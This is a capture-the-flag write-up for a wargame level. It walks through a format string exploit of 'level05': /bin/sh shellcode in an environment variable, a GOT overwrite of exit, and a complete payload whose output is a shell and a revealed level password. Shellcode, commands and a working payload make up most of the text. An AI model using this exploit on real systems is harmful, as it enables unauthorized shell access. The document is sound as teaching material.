1. Understand the binary

We've started executing the binary to see what was asking.

It asked for an input and it was printing the input.

We've opened the binary with gdb and running the 'info functions' command we've seen that printf was called.

We've started to test to see if a Format String Vulnerability was present.

We've tested with multiple inputs:
	- %p %p %p %p: printed some address
	- %s: Segmentation fault (core dumped)

With this tests we've undestood that in the code there was something like this:

int main()
{
	char s[100];
	fgets(s, 100, stdin);
	printf(s); <-- vulnerable printf
	exit (0);
}

2. Format String Exploit

A FSE is an exploit based on injecting, using the vulnerable printf, some shellcode at a address
in memory that will be called at some point in the program. To do this we need to choose a address
from the Global Offset Table. In our program we choosed to inject the shellcode at the exit@got address
since is the only funciton that we have after the printf.

To do a FSE we need:
	- Shellcode to export as a variable in the env that execute a /bin/sh.
	- Find the address of the exported variable using gdb during program execution and the address
	  of the exit on the GOT.
	- Find the position on the Stack relative to our printf to understand where to write the address of
	  the env variable.
	- Build a payload to overwrite the exit address with the shellcode env var address.
	- Write the shellcode at the address using python and the payload.

We found online a bytecode that execute a /bin/sh (shellcode):

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80

That is the bytecode for more or less this program:

int main() 
{
    execve("/bin/sh", NULL, NULL);

    return (0);
}

We exported the shellcode using python -c to add a NOP sled beginning of the env variable.
A NOP sled is a series of identical values in memory that instruct the CPU to take no action
and proceed to the next instruction. In our case we used \x90 as character (for Intel).

export SHELLCODE=$(python -c "print '\x90' * 200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80' ")

The NOP sled length is arbitrary as long as it overflows the env entry into another address.


After we run

gdb level05 

put a breakpoint on main

b main

run the code and examinated the first 200 environ addesses at the breakpoint using

x/200s environ

and we found the end of the shellcode address:

0xffffd8ca:	 "\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\207\343\260\v̀".

Now we disassembled exit

disas exit

0x08048370 <+0>:	jmp    *0x80497e0 <-- jump to the call on the GOT
0x08048376 <+6>:	push   $0x18
0x0804837b <+11>:	jmp    0x8048330

and we examine the jump address to find the GOT address

x 0x80497e0

0x80497e0 <exit@got.plt>:	0x08048376


To find our write offset for the shellcode env var address we can test using
AAAA and a %p. When the output will be 0x41414141 (A = 41 in hex) it means we have found the
right position.

AAAA%10$p
aaaa0x61616161 (61 because level05 binary do a tolowercase before printing the input)


So we need to overwrite 0x080497e0 (exit@got) with 0xffffd8ca (shellcode in env) at postion 10 on the Stack.

Since we have to write 4294957258 chars (0xffffd8ca in decimal) at a specific address that are too many,
we need to divide between the higher and lower order bytes of the address.

It means writing 0xffff (65535) @ 0x080497e0 + 2 = 0x080497e2 (high order)
             and 0xd8ca (55498) @ 0x080497e0 (low order)

Now, we have to figure out the value to set for the padding. Here is the formula

[The value we want] - [The bytes alredy wrote] = [The value to set].

Let's start with the low order bytes :

It'll will be 55498 - 8 = 55490, because we already wrote 8 bytes (the two 4 bytes addresses).

Then, the high order bytes :

It'll will be 65535 - 55498 = 10037, because we already wrote 55498 bytes (the two 4 bytes addresses and 55490
bytes from the previous writing).

Now we can build our exploit:

\xe2\x97\x04\x08

It'll be: \xe0\x97\x04\x08 \xe2\x97\x04\x08 %55490x %10$hn %10037x %11$hn

- \xe0\x97\x04\x08 or 0x080497e0 (in reverse order) points to the low order bytes.
- \xe2\x97\x04\x08 or 0x080497e2 (in reverse order) points to the high order bytes.
- %55490× will write 55490 bytes on the standard output.
- %10$hn will write 8 + 55490 = 55498 bytes (or 0xd8ca) at the first address specified (0x080497e0).
- %10037x will write 10037 bytes on the standard output.
- %11$hn will write 8 + 55490 + 10037 = 65535 (or 0xffff) at the second address specified (0x080497e2).

Now as usual:

python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55490x' + '%10\$n' + '%10037x' + '%11\$n'" > /tmp/exploit

                                                                           ^                      ^
																	We need to escape the two $ for the shell.

cat /tmp/exploit - | ./level05

Now we are in a shell with level06 privileges

whoami
level06

cat ~level06/.pass                
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq